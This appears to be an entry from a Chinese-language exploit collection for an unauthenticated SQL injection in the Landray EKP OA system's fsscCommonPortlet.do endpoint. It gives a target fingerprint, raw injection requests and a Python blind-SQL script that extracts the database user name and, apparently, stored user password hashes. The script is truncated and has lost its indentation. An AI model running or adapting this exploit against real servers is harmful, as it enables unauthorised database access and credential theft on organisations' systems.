# 蓝凌EKP系统fsscCommonPortlet.do存在未授权SQL注入漏洞

- **系统**：蓝凌EKP系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="Landray-OA系统"`
- **请求**：`POST /ekp/fssc/common/fssc_common_portlet/fsscCommonPortlet.do HTTP/1.1`

**请求体 / payload**
```
访问save方法，填充一下数据库
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
method=saveICare&fdId=&fdNum=1&docSubject=1&fdName=1&createTime=1&fdStatus=1
POST /ekp/fssc/common/fssc_common_portlet/fsscCommonPortlet.do HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
method=getICareByFdId&fdNum=asdasd'+or+'1'='1&ordertype=down
import argparse
import requests
header = {
"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
def exploit_user(url,db_user):
global header
user_name = ""
for i in range(1, 20):
low = 1
top = 255
mid = (low + top) // 2
while low < top:
send_data = {
"method": "getICareByFdId",
"ordertype": "down",
"fdNum": "aNsSl' or ascii(substring((user_name()),{},1)) < {} and '1'='1".format(
i, mid)
res = requests.post(url, data=send_data, headers=header)
if "docSubject" in res.text:
top = mid
else:
low = mid + 1
mid = (top + low) // 2
if mid <= 1 or mid >= 254:
break
user_name = user_name + chr(mid - 1)
print("[+]user_name:{}".format(user_name))
print("\033[F", end="")
print("[+]user_name:{}".format(user_name))
def exploit(url,username):
global header
password_len = 32
password = ""
for i in range(1,password_len+1):
low = 1
top = 255
mid = (low + top) // 2
while low < top:
send_data = {
"method": "getICareByFdId",
"ordertype": "down",
"fdNum": "aNsSl' or ascii(substring((select fdPassword from com.landray.kmss.sys.organization.model.SysOrgPer…（脚本共 2930 字，完整版见原文）
```
- **预期**：200　|　—